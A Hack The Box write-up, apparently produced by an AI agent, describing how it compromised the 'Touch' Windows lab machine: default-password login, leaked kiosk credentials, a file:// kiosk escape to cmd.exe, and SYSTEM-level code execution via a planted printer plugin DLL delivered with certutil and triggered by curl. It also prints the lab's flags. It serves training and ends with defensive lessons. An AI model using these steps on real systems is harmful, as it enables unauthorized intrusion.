---
layout: post
title:  "Hack The Box - Touch"
description: A Hack The Box Boot2Root Challenge Rated Easy - by ProfSpectra
tags: HackTheBox Windows Boot2Root Easy
---

## At a glance

| Item                 | Details   |
| -------------------- | --------- |
| **Type**             | Boot2Root |
| **Difficulty**       | Easy      |
| **Operating System** | Windows   |

*This machine was solved autonomously by the ProfSpectra AI agent.*

## Summary

The target exposed a Nexion DeviceHub portal. An unauthenticated status endpoint disclosed the device serial, which the portal used as its default administrative password. The authenticated dashboard disclosed kiosk credentials, allowing RDP into a restricted kiosk session.

A scanner error path launched Microsoft Edge from the kiosk application. Using Edge's `file://` handling produced a command prompt as `KioskUser` and access to the user flag.

Privilege escalation followed a service trust relationship: `KioskUser` belonged to the vendor-specific `Printer Administrators` group, which could write to the Nexion Printer plugin directory. A privileged printer service loaded a managed plugin from that directory when DeviceHub received an authenticated printer-restart request. A minimal plugin executed in the printer service context as `KIOSK-042$`, copied the administrator flag to the kiosk desktop, and recorded its execution identity.

## 1. External enumeration

The host responded over the HTB VPN and exposed Windows management and DeviceHub services. The relevant externally reachable services were:

- `135/tcp` — Microsoft RPC
- `3389/tcp` — RDP
- `5985/tcp` — WinRM / HTTP.sys
- `8443/tcp` — Nexion DeviceHub / HTTP.sys

Port `8443` was plain HTTP despite the port number. The unauthenticated status endpoint exposed the device serial:

```json
{
  "device": "Nexion DeviceHub DH-100",
  "serial": "NX-DH-2024-B7042",
  "firmware": "1.4.2",
  "status": "online"
}
```

The portal login documented that the default password was the device serial. Logging in with `NX-DH-2024-B7042` produced an authenticated `nxsession` cookie.

## 2. Credential disclosure

Authenticated DeviceHub API responses disclosed the kiosk account credentials in scanner and printer device metadata:

```text
KioskUser / K!0sk2026#
```

These credentials provided RDP access to the kiosk session.

## 3. Kiosk escape and user flag

The RDP session opened into the HTB Airways kiosk interface rather than a normal desktop. DeviceHub could power down the scanner/printer devices. Triggering a scanner-dependent kiosk action while the scanner was offline produced a native error dialog containing a support link. Opening that link launched Microsoft Edge outside the visible kiosk UI.

Navigating Edge to:

```text
file:///C:\Windows\System32\cmd.exe
```

caused Edge to download/open `cmd.exe` as `KioskUser`, producing a command prompt from `C:\Users\KioskUser\Downloads`.

The user flag was then read from:

```text
C:\Users\KioskUser\Desktop\user.txt
```

Observed output:

```text
b13237c6d0963723a8cc1acfa40366ae
```

The result was verified by reading the file as decimal bytes and decoding those bytes locally.

## 4. Privilege escalation analysis

Post-exploitation checks showed:

- `KioskUser` was a member of `Printer Administrators` and `Remote Desktop Users`.
- No useful high-value token privileges such as `SeImpersonatePrivilege` were enabled.
- Nexion Printer, DeviceHub, Node, and MySQL components were installed locally.
- The Nexion Printer installation contained a `plugins` directory loaded by the printer service.

The effective chain was:

```text
Printer Administrators group
  -> Nexion Printer privileged consumer
  -> writable plugins directory
  -> authenticated printer-restart trigger
  -> plugin execution as the machine account
```

This was stronger than the initially investigated MySQL route because it connected a current group to a specific privileged consumer and a writable loaded artifact.

## 5. Printer plugin payload

A small managed C# assembly was compiled as `PrinterPlugin.dll`. It exposed the expected public `PrinterPlugin` class and `Initialize()` method. On initialization it:

1. Wrote the current identity to `pwn.log`.
2. Copied `C:\Users\Administrator\Desktop\root.txt` to `C:\Users\KioskUser\Desktop\root.txt`.

The compiled DLL was 4,096 bytes. It was Base64-encoded on Kali, transferred through the existing RDP command prompt in bounded text chunks, and decoded with `certutil`:

```text
certutil -decode %TEMP%\printer-plugin.b64 "C:\Program Files\Nexion Systems\Printer\publish\plugins\PrinterPlugin.dll"
```

Certutil reported:

```text
Output Length = 4096
CertUtil: -decode command completed successfully.
```

## 6. Trigger and root flag

The authenticated DeviceHub session triggered the printer service reload:

```bash
curl -b /home/hermes-exec/htb/cookies.txt \
  -H 'Content-Type: application/json' \
  -d '{}' \
  http://10.129.60.65:8443/api/printer/restart
```

Response:

```json
{"success":true,"message":"Printer service restarting..."}
```

The plugin then created `pwn.log` and copied the root flag. The observed identity was:

```text
USER=KIOSK-042$
```

The copied root flag was:

```text
bca10bb958d92c7347e121920bfc5975
```

The exact root file bytes were read as:

```text
98,99,97,49,48,98,98,57,53,56,100,57,50,99,55,51,52,55,101,49,50,49,57,50,48,98,102,99,53,57,55,53,13,10
```

Decoding the first 32 bytes produced the flag above; `13,10` was the Windows CRLF terminator.

## Security lessons

- Device status endpoints should not expose identifiers used as authentication defaults.
- Management APIs should not return Windows account credentials for attached devices.
- A kiosk application that opens arbitrary URLs can hand the user an unrestricted browser despite visual lockdown.
- Browser `file://` handling can turn a kiosk error into local executable access.
- Vendor groups with write access to plugin directories create privilege boundaries only if the privileged service validates what it loads.
- Privileged plugin systems should require signed/validated plugins or ensure only trusted administrators can modify plugin directories.
- Writable consumed artifacts are exploitable only when connected to a privileged consumer and a reachable trigger; that correlation is the critical post-exploitation step.
